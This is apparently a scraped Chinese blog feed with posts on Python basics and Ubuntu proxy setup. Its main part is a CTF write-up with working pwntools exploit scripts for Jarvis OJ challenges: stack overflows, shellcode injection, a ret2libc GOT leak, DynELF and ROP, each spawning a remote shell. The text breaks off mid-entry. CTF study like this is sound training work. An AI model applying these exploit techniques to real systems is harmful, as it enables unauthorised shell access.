7</p><p>&gt;&gt;&gt; eval( ‘3 * x’ )</p><p>21</p><p>&gt;&gt;&gt; eval(‘pow(2,2)’)</p><p>4</p><p>&gt;&gt;&gt; eval(‘2 + 2’)</p><p>4</p><p>&gt;&gt;&gt; n=81</p><p>&gt;&gt;&gt; eval(“n + 4”)</p><p>85</p><h3 id="5-文件函数"><a href="#5-文件函数" class="headerlink" title="5.文件函数"></a>5.文件函数</h3><p>打开文件：f=open(“in.txt”,”r”)</p><p>一次读取自定义个数的字符：s=f.read(3)</p><p>f = open(“data.txt”,”r”)  #设置文件对象</p><p>f.close() #关闭文件</p><p>#为了方便，避免忘记close掉这个文件对象，可以用下面这种方式替代</p><p>with open(‘data.txt’,”r”) as f:  #设置文件对象</p><p>  str = f.read()  #可以是随便对文件的操作</p><h3 id="6-split-函数"><a href="#6-split-函数" class="headerlink" title="6.split()函数"></a>6.split()函数</h3><p>split翻译为分裂。 split()就是将一个字符串分裂成多个字符串组成的<strong>列表</strong>。</p><p>split()当不带参数时以空格进行分割，当代参数时，以该参数进行分割。</p><p>典例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;hello boy&lt;[www.doiido.com]&gt;byebye&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot;[&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;]&quot;</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-string">&#x27;www.doiido.com&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot;[&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;]&quot;</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;.&quot;</span>)<br>[<span class="hljs-string">&#x27;www&#x27;</span>, <span class="hljs-string">&#x27;doiido&#x27;</span>, <span class="hljs-string">&#x27;com&#x27;</span>]<br></code></pre></td></tr></table></figure><p>split(“[“)[1]：意思是将字符串分裂成列表后取下标为1的元素。</p><p>split() 方法语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span>.split(<span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;&quot;</span>, num=string.count(<span class="hljs-built_in">str</span>)).<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;Line1-abcdef \nLine2-abc \nLine4-abcd&quot;</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">1</span> )<br>输出：<br>[<span class="hljs-string">&#x27;Line1-abcdef&#x27;</span>, <span class="hljs-string">&#x27;\nLine2-abc \nLine4-abcd&#x27;</span>]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu虚拟机终端代理设置</title>
    <link href="/2022/02/21/proxy_set/"/>
    <url>/2022/02/21/proxy_set/</url>
    
    <content type="html"><![CDATA[<p>主机的代理客户端是ss,虚拟机的网络连接为NAT模式</p><span id="more"></span><p>ubuntu设置网络代理</p><p><img src="proxy_set/1.png"></p><p>使用curl ifconfig.me会返回出口的公网IP<br>使用curl <a href="http://www.google.com测试,返回一大串字符,说明配置成功/">www.google.com测试，返回一大串字符，说明配置成功</a></p><p>但ping google.com就不能ping通</p><p>这样子还不能用apt-get和wget命令</p><p><img src="proxy_set/2.png"></p><p>可以用以下方法解决</p><p>在终端中直接运行：</p><p>走http代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">export http_proxy=http://proxyAddress:port<br></code></pre></td></tr></table></figure><p>走https代理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">export https_proxy=http://proxyAddress:port<br></code></pre></td></tr></table></figure><p>或者直接</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">ALL_PROXY</span>=<span class="hljs-string">&quot;socks5://192.168.133.1:1080&quot;</span><br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">all_proxy</span>=<span class="hljs-string">&quot;socks5://192.168.133.1:1080&quot;</span><br></code></pre></td></tr></table></figure><p>查看代理</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">env<span class="hljs-string">|grep -I proxy</span><br></code></pre></td></tr></table></figure><p>取消代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">unset</span> http_proxy<br><span class="hljs-built_in">unset</span> https_proxy<br></code></pre></td></tr></table></figure><h2 id="永久配置"><a href="#永久配置" class="headerlink" title="永久配置"></a>永久配置</h2><p>把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">gedit ~/.bashrc <br>export http_proxy=&quot;http://localhost:port&quot;<br>export https_proxy=&quot;http://localhost:port&quot;<br></code></pre></td></tr></table></figure><p>或者走socket5协议（ss,ssr）的话，代理端口是1080</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">export http_proxy=&quot;socks5://192.168.133.1:1080&quot;<br>export https_proxy=&quot;socks5://192.168.133.1:1080&quot;<br></code></pre></td></tr></table></figure><p>或者干脆直接设置ALL_PROXY</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">export ALL_PROXY=socks5://192.168.133.1:1080<br></code></pre></td></tr></table></figure><p>最后在执行如下命令应用设置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">source ~/.bashrc<br></code></pre></td></tr></table></figure><p>或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs console">alias setproxy=&quot;export ALL_PROXY=socks5://192.168.133.1:1080&quot; alias unsetproxy=&quot;unset ALL_PROXY&quot;<br></code></pre></td></tr></table></figure><h3 id="apt的配置"><a href="#apt的配置" class="headerlink" title="apt的配置"></a>apt的配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sudo gedit /etc/apt/apt.conf<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">Acquire::http::Proxy &quot;http://yourproxyaddress:proxyport&quot;;<br>Acquire::https::proxy &quot;https://yourproxyaddress:proxyport&quot;;<br>Acquire::ftp::proxy &quot;ftp://yourproxyaddress:proxyport&quot;;<br>Acquire::socks::proxy &quot;socks://yourproxyaddress:proxyport&quot;;<br><br><br>我的就是：<br>Acquire::http::Proxy &quot;http://192.168.133.1:1080&quot;;<br>Acquire::https::proxy &quot;https://192.168.133.1:1080&quot;;<br>Acquire::ftp::proxy &quot;ftp://192.168.133.1:1080&quot;;<br>Acquire::socks::proxy &quot;socks://192.168.133.1:1080&quot;;<br></code></pre></td></tr></table></figure><h3 id="git的配置"><a href="#git的配置" class="headerlink" title="git的配置"></a>git的配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">git config --global http.proxy &#x27;socks5://192.168.133.1:1080&#x27; <br>git config --global https.proxy &#x27;socks5://192.168.133.1:1080&#x27;<br></code></pre></td></tr></table></figure><h3 id="环境变量-etc-environment"><a href="#环境变量-etc-environment" class="headerlink" title="环境变量 /etc/environment"></a>环境变量 /etc/environment</h3><p>添加</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">http_proxy</span>=<span class="hljs-string">&quot;http://192.168.133.1:1080/&quot;</span><br><span class="hljs-attr">https_proxy</span>=<span class="hljs-string">&quot;https://192.168.133.1:1080/&quot;</span><br><span class="hljs-attr">ftp_proxy</span>=<span class="hljs-string">&quot;ftp://192.168.133.1:1080/&quot;</span><br><span class="hljs-attr">socks_proxy</span>=<span class="hljs-string">&quot;socks://192.168.133.1:1080/&quot;</span><br></code></pre></td></tr></table></figure><p>参考：<a href="https://zhuanlan.zhihu.com/p/46973701">https://zhuanlan.zhihu.com/p/46973701</a></p><p>apt配置参考<a href="https://askubuntu.com/questions/257290/configure-proxy-for-apt">https://askubuntu.com/questions/257290/configure-proxy-for-apt</a></p><p>git配置可参考<a href="https://gist.github.com/laispace/666dd7b27e9116faece6">https://gist.github.com/laispace/666dd7b27e9116faece6</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/02/21/Jarvis_OJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/02/21/Jarvis_OJ%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h3 id="XMAN-level2"><a href="#XMAN-level2" class="headerlink" title="[XMAN]level2"></a>[XMAN]level2</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">sh</span>=remote(&#x27;pwn<span class="hljs-number">2</span>.jarvisoj.com&#x27;,<span class="hljs-number">9878</span>)<br><br><span class="hljs-attribute">binsh_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0804</span>a<span class="hljs-number">024</span><br><span class="hljs-attribute">system_plt</span> = <span class="hljs-number">0</span>x<span class="hljs-number">08048320</span><br><span class="hljs-attribute">payload</span> = flat([&#x27;a&#x27; * (<span class="hljs-number">0</span>x<span class="hljs-number">88</span>+<span class="hljs-number">4</span>), system_plt, &#x27;b&#x27; * <span class="hljs-number">4</span>, binsh_addr])<br><span class="hljs-attribute">sh</span>.sendline(payload)<br><br><span class="hljs-attribute">sh</span>.interactive()<br></code></pre></td></tr></table></figure><h3 id="XMAN-level1"><a href="#XMAN-level1" class="headerlink" title="[XMAN]level1"></a>[XMAN]level1</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><br><span class="hljs-attribute">a</span>=remote(&quot;pwn2.jarvisoj.com&quot;,&quot;9877&quot;)<br><br>a.recvuntil(<span class="hljs-string">&quot;What&#x27;s this:&quot;</span>)<br><br><span class="hljs-attribute">addr</span>=a.recvuntil(&quot;?&quot;)<br><br><span class="hljs-attribute">addr</span>=addr[0:-1]<br><br><span class="hljs-attribute">addr1</span>=eval(addr)<br><br><span class="hljs-builtin-name">print</span>(addr)<br><br><span class="hljs-attribute">shellcode</span>=asm(shellcraft.i386.linux.sh())<br><br><span class="hljs-builtin-name">print</span>(len(shellcode))<br><br><span class="hljs-attribute">payload</span>=shellcode+&#x27;A&#x27;*(140-len(shellcode))+p32(addr1)<br><br>a.send(payload)<br><br>a.interactive()<br></code></pre></td></tr></table></figure><p>​    </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python<br><br># -*- coding: utf-<span class="hljs-number">8</span> -*-<br><br>from pwn import *<br>import sys<br>context.binary = <span class="hljs-string">&quot;./level1&quot;</span><br><br>shellcode = <span class="hljs-built_in">asm</span>(shellcraft.<span class="hljs-built_in">sh</span>())<br>if sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;0&quot;</span><br>    io = <span class="hljs-built_in">process</span>(<span class="hljs-string">&quot;./level1&quot;</span>)<br>else:<br>    io = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="hljs-number">9877</span>)<br>#https://www.cnblogs.com/aland-<span class="hljs-number">1415</span>/p/<span class="hljs-number">6613449</span>.html<br>io.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;this:&quot;</span>)<br>buf_addr = <span class="hljs-built_in">int</span>(io.<span class="hljs-built_in">recvuntil</span>(<span class="hljs-string">&quot;?\n&quot;</span>, drop = True), <span class="hljs-number">16</span>)<br><br>payload = <span class="hljs-built_in">asm</span>(shellcraft.<span class="hljs-built_in">sh</span>()).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">0</span>x88 + <span class="hljs-number">0</span>x4, <span class="hljs-string">&#x27;\0&#x27;</span>) + <span class="hljs-built_in">p32</span>(buf_addr)<br>io.<span class="hljs-built_in">send</span>(payload)<br><br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python<br><br># -*- coding: utf-<span class="hljs-number">8</span> -*-<br><br>from pwn import *<br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>, arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>shellcode = <span class="hljs-built_in">asm</span>(shellcraft.<span class="hljs-built_in">sh</span>())<br>#io = <span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./level1&#x27;</span>)<br>io = <span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;pwn2.jarvisoj.com&#x27;</span>, <span class="hljs-number">9877</span>)<br>text = io.<span class="hljs-built_in">recvline</span>()[<span class="hljs-number">14</span>: -<span class="hljs-number">2</span>]<br>#相当于<span class="hljs-built_in">recvline</span>(keepends=True)，接受一行数据，keepends为是否保留行尾的\n<br>#这里字符串<span class="hljs-string">&quot;What&#x27;s this:%p?\n&quot;</span>接受buf的地址数据<br>#print text[<span class="hljs-number">14</span>:-<span class="hljs-number">2</span>]<br>buf_addr = <span class="hljs-built_in">int</span>(text, <span class="hljs-number">16</span>)<br><br>payload = shellcode + <span class="hljs-string">&#x27;\x90&#x27;</span> * (<span class="hljs-number">0</span>x88 + <span class="hljs-number">0</span>x4 - <span class="hljs-built_in">len</span>(shellcode)) + <span class="hljs-built_in">p32</span>(buf_addr)<br>io.<span class="hljs-built_in">send</span>(payload)<br>io.<span class="hljs-built_in">interactive</span>()<br>io.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><h3 id="XMAN-level3"><a href="#XMAN-level3" class="headerlink" title="[XMAN]level3"></a>[XMAN]level3</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn import *<br>    <br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br><br><span class="hljs-attribute">local</span>=0<br><span class="hljs-keyword">if</span> local:<br>     <span class="hljs-attribute">p</span>=process(&#x27;./level3&#x27;)<br>     libc = ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>     p = remote(<span class="hljs-string">&#x27;pwn2.jarvisoj.com&#x27;</span>, 9879)<br>     <span class="hljs-attribute">libc</span>=ELF(&#x27;./libc-2.19.so&#x27;)<br>plt_write = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>got_write = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>vulfun_addr = elf.symbols[<span class="hljs-string">&quot;vulnerable_function&quot;</span>]<br><br>payload1 = <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*140</span> + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)<br><br>p.recvuntil(<span class="hljs-string">&quot;Input:\n&quot;</span>)#没有这个截断接收会造成地址错误<br><br>p.send(payload1)<br><br>write_addr = u32(p.recv(4))<br><span class="hljs-built_in">..</span>.<br>关于unpack<br>&gt;&gt;&gt; u32(<span class="hljs-string">&quot;\x00\x00\x04\x08&quot;</span>)<br>134479872   十进制数<br>&gt;&gt;&gt; hex(134479872)<br><span class="hljs-string">&#x27;0x8040000&#x27;</span><br><span class="hljs-built_in">..</span>.<br><br><span class="hljs-attribute">base_addr</span>=write_addr-libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>system_addr = base_addr+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>binsh_addr = base_addr+libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>).next()<br><br>payload2 = <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)<br>p.recvuntil(<span class="hljs-string">&quot;Input:\n&quot;</span>)<br>p.send(payload2)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>思路：</p><p>要利用偏移相等获得system和bin的地址，首先要泄露得到write的真实地址</p><p>可以通过打印write在got表中的地址，获取其真实地址</p><p>所以首先要输出write_got所对应的地址</p><p>所以先构造下图栈帧，先通过溢出write函数打印write_got</p><p>再返回到vuln函数再次执行read，实现二次溢出到system，最终获取shell</p><p>找了张图</p><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltYWdlczIwMTguY25ibG9ncy5jb20vYmxvZy8xMjUxMzI0LzIwMTcxMS8xMjUxMzI0LTIwMTcxMTI2MjE1NTUzNDY4LTE3MjE3MzEzMjIucG5n.jpg" alt="img" style="zoom: 33%;" /><img src="https://bbsmax.ikafan.com/static/L3Byb3h5L2h0dHBzL2ltYWdlczIwMTguY25ibG9ncy5jb20vYmxvZy8xMjUxMzI0LzIwMTcxMS8xMjUxMzI0LTIwMTcxMTI2MjE0ODE5NTc4LTExNTIwMzYyODMucG5n.jpg" alt="img" style="zoom:33%;" /><h3 id="XMAN-level4"><a href="#XMAN-level4" class="headerlink" title="[XMAN]level4"></a>[XMAN]level4</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">conn</span>=remote(&#x27;pwn<span class="hljs-number">2</span>.jarvisoj.com&#x27;,&#x27;<span class="hljs-number">9880</span>&#x27;)<br><span class="hljs-comment">#conn=process(&#x27;./level4&#x27;)</span><br><span class="hljs-attribute">e</span>=ELF(&#x27;./level<span class="hljs-number">4</span>&#x27;)<br><span class="hljs-attribute">pad</span>=<span class="hljs-number">0</span>x<span class="hljs-number">88</span><br><span class="hljs-attribute">write_plt</span>=e.symbols[&#x27;write&#x27;]<br><span class="hljs-attribute">vul_addr</span>=<span class="hljs-number">0</span>x<span class="hljs-number">804844</span>b<br><span class="hljs-attribute">bss_addr</span>=<span class="hljs-number">0</span>x<span class="hljs-number">0804</span>a<span class="hljs-number">024</span><br><span class="hljs-attribute">def</span> leak(address):<br>    <span class="hljs-attribute">payload1</span>=&#x27;a&#x27;*pad+<span class="hljs-string">&quot;BBBB&quot;</span>+p<span class="hljs-number">32</span>(write_plt)+p<span class="hljs-number">32</span>(vul_addr)+p<span class="hljs-number">32</span>(<span class="hljs-number">1</span>)+p<span class="hljs-number">32</span>(address)+p<span class="hljs-number">32</span>(<span class="hljs-number">4</span>)<br>    <span class="hljs-attribute">conn</span>.sendline(payload<span class="hljs-number">1</span>)<br>    <span class="hljs-attribute">data</span>=conn.recv(<span class="hljs-number">4</span>)<br>    <span class="hljs-attribute">return</span> data <br><span class="hljs-attribute">d</span>=DynELF(leak,elf=e)<br><span class="hljs-attribute">system_addr</span>=d.lookup(&#x27;system&#x27;,&#x27;libc&#x27;)<br><span class="hljs-attribute">print</span> hex(system_addr)<br><span class="hljs-attribute">read_plt</span>=e.symbols[&#x27;read&#x27;]<br><span class="hljs-attribute">payload2</span>=&#x27;a&#x27;*pad+<span class="hljs-string">&quot;BBBB&quot;</span>+p<span class="hljs-number">32</span>(read_plt)+p<span class="hljs-number">32</span>(vul_addr)+p<span class="hljs-number">32</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">32</span>(bss_addr)+p<span class="hljs-number">32</span>(<span class="hljs-number">8</span>)<br><span class="hljs-attribute">conn</span>.sendline(payload<span class="hljs-number">2</span>)<br><span class="hljs-attribute">conn</span>.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-attribute">payload3</span>=<span class="hljs-string">&quot;a&quot;</span>*pad+<span class="hljs-string">&quot;BBBB&quot;</span>+p<span class="hljs-number">32</span>(system_addr)+&#x27;dead&#x27;+p<span class="hljs-number">32</span>(bss_addr)<br><span class="hljs-attribute">conn</span>.sendline(payload<span class="hljs-number">3</span>)<br><span class="hljs-attribute">conn</span>.interactive()<br></code></pre></td></tr></table></figure><p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell">p = <span class="hljs-keyword">process</span>(<span class="hljs-string">&#x27;./xxx&#x27;</span>)<br>def leak(address):<br>  <span class="hljs-comment">#各种预处理</span><br>  payload = <span class="hljs-string">&quot;xxxxxxxx&quot;</span> + address + <span class="hljs-string">&quot;xxxxxxxx&quot;</span><br>  p.send(payload)<br>  <span class="hljs-comment">#各种处理</span><br>  <span class="hljs-keyword">data</span> = p.recv(<span class="hljs-number">4</span>)<br>  log.debug(<span class="hljs-string">&quot;%#x =&gt; %s&quot;</span> % (address, (<span class="hljs-keyword">data</span> or <span class="hljs-string">&#x27;&#x27;</span>).encode(<span class="hljs-string">&#x27;hex&#x27;</span>)))<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span><br>d = DynELF(leak, elf=ELF(<span class="hljs-string">&quot;./xxx&quot;</span>))      <span class="hljs-comment">#初始化DynELF模块 </span><br>systemAddress = d.lookup(<span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;libc&#x27;</span>)  <span class="hljs-comment">#在libc文件中搜索system函数的地址</span><br></code></pre></td></tr></table></figure><p>address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。</p><p>参考</p><h3 id="XMAN-level2-x64"><a href="#XMAN-level2-x64" class="headerlink" title="[XMAN]level2(x64)"></a>[XMAN]level2(x64)</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-attribute">from</span> pwn import  *<br><br><span class="hljs-attribute">io</span> = remote(<span class="hljs-string">&quot;pwn2.jarvisoj.com&quot;</span>,<span class="hljs-number">9882</span>)<br><br><span class="hljs-attribute">sys_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">40063</span>E<br><br><span class="hljs-attribute">binsh_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">600</span>A<span class="hljs-number">90</span>   <br><br><span class="hljs-attribute">pop_rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">4006</span>B<span class="hljs-number">3</span><br><br><span class="hljs-attribute">payload</span>  = &#x27;a&#x27; * <span class="hljs-number">0</span>x<span class="hljs-number">88</span><br><br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(pop_rdi_ret)<br><br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(binsh_addr)<br><br><span class="hljs-attribute">payload</span> += p<span class="hljs-number">64</span>(sys_addr)<br><br><span class="hljs-attribute">io</span>.sendline(payload)<br><br>                                                        <span class="hljs-attribute">io</span>.interactive()<br><br><span class="hljs-attribute">io</span>.close()<br></code></pre></td></tr></table></figure><p>x64系统下当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。所以我们要想办法向rdi里面写入参数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ROPgadget</span> --binary level<span class="hljs-number">2</span>_x<span class="hljs-number">64</span> --only <span class="hljs-string">&quot;pop|ret&quot;</span>|grep rdi<br></code></pre></td></tr></table></figure><h3 id="XMAN-level3-x64"><a href="#XMAN-level3-x64" class="headerlink" title="[XMAN]level3(x64)"></a>[XMAN]level3(x64)</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 